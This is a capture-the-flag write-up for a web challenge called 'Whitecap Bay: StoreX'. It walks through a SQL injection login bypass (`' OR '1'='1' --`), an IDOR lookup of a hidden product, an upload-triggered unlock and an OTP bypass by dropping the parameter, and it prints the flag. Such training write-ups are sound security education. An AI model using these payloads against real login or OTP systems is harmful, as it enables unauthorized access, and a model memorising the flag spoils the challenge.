# 🏴‍☠️ Whitecap Bay: StoreX — CTF Writeup

## Challenge Information
- **Challenge Name:** Whitecap Bay - StoreX  
- **Category:** Web Exploitation  
- **Difficulty:** Hard  
- **Points:** 500  
- **Flag:** `STOREX{burp_can_break_logic_not_crypto}`  

---

## Challenge Description

> The Sirens of Whitecap Bay guard a hidden e-commerce platform. Beautiful on the surface, but deadly underneath. Navigate through SQL injection, insecure object references, and a final logic flaw to claim the treasure. The Sirens call to you - will you escape their net?

---

## 🎯 Challenge Overview

This challenge simulates a hardened e-commerce platform with multiple chained vulnerabilities:

1. **SQL Injection** – Authentication bypass  
2. **IDOR (Insecure Direct Object Reference)** – Hidden product discovery  
3. **Logic Flow Exploitation** – File upload triggering  
4. **Business Logic Flaw** – OTP bypass through parameter manipulation  

Players must chain these vulnerabilities in sequence to obtain the flag.

---

## 🔍 Reconnaissance

### Initial Access

URL:
```
http://challenge.whitecapbay.ctf/
```

Page Title:
```
Whitecap Bay - The Siren's Gate
```

Page Features:
- Username/email input field
- Password input field
- Warning text: *"Beautiful on the surface, deadly underneath..."*
- Siren-themed ocean design

### Testing Basic Credentials

| Username | Password | Result |
|--------|----------|--------|
| admin  | admin    | ❌ Failed |
| admin  | password | ❌ Failed |
| test   | test     | ❌ Failed |

---

## 🚪 Stage 1: SQL Injection – Authentication Bypass

### Discovery

Login request intercepted in Burp Suite:

```
POST / HTTP/1.1
Host: challenge.whitecapbay.ctf
Content-Type: application/x-www-form-urlencoded

email=admin&password=test
```

Different error behavior suggested SQL injection.

### Payload Testing

| Payload | Result |
|-------|--------|
| `admin'` | SQL error |
| `admin'--` | Incorrect syntax |
| `' OR '1'='1' --` | ✅ Success |

### Exploitation

```
email=' OR '1'='1' --&password=irrelevant
```

Redirected to:
```
/dashboard
```

### Result

- ✅ Authentication bypassed
- ✅ Dashboard access obtained
- ✅ Partial session created

---

## 📦 Stage 2: IDOR – Hidden Product Discovery

### Dashboard Overview

- 🌊 Surface Waters: Safe  
- 💎 Hidden Treasures: Beneath the Waves  
- 📦 Sunken Cargo: Accessible  
- 🧜‍♀️ Siren's Lair: Restricted  

### Products Enumeration

Visible products:

| ID | Product |
|----|--------|
| 1 | Navigation Charts |
| 2 | Fishing Nets |
| 4 | Rum Barrels |

ID **3** was missing.

### IDOR Exploitation

```
GET /product?id=3
```

Response:

```
Siren Song Compass
CLASSIFIED: Officers Only - Ancient artifact that reveals hidden paths
```

Unlocked link:

```
/upload
```

### Result

- ✅ Hidden product discovered
- ✅ Session flag: `idor_found = True`
- ✅ Upload feature unlocked

---

## 🎣 Stage 3: File Upload – Smuggler's Network

### Upload Page

```
/upload
```

Description:
> Cargo not stored locally – only synchronized

### Exploitation

Upload any file:

```
filename: test.txt
content: dummy content
```

Redirected to dashboard.

New status:

```
🔱 Ancient Vault: Unlocked
```

New link:

```
/otp
```

### Result

- ✅ Upload triggered internal process
- ✅ Session flag: `internal_sync = True`
- ✅ OTP module activated

---

## 🔱 Stage 4: Logic Flaw – OTP Bypass

### OTP Page

```
/otp
```

Input:
```
6-digit OTP
```

Normal attempt:

```
otp=123456
```

Result:
```
Invalid OTP
```

### Hint

HTML comment:
```
Sometimes absence speaks louder than presence...
```

### Exploitation: Parameter Removal

Original request:

```
otp=123456
```

Modified request:

```
[no parameters]
```

### Response

```
STOREX{burp_can_break_logic_not_crypto}
```

Treasure successfully claimed.

---

## 🏁 Final Result

| Stage | Status |
|------|--------|
| SQL Injection | ✅ |
| IDOR | ✅ |
| File Upload Trigger | ✅ |
| OTP Logic Bypass | ✅ |
| Flag | ✅ Captured |

---

## 🏴‍☠️ Conclusion

This challenge demonstrates a critical real-world lesson:

> **Logic flaws can be more dangerous than cryptographic weaknesses.**

The OTP system was not broken through brute force — it was bypassed by understanding how the application handled missing parameters.

---

## 📌 Flag

```
STOREX{burp_can_break_logic_not_crypto}
```

---

**CTF Name:** Whitecap Bay  
**Challenge:** StoreX  
**Writeup by:** Muhammad Haris 🧑‍💻🏴‍☠️
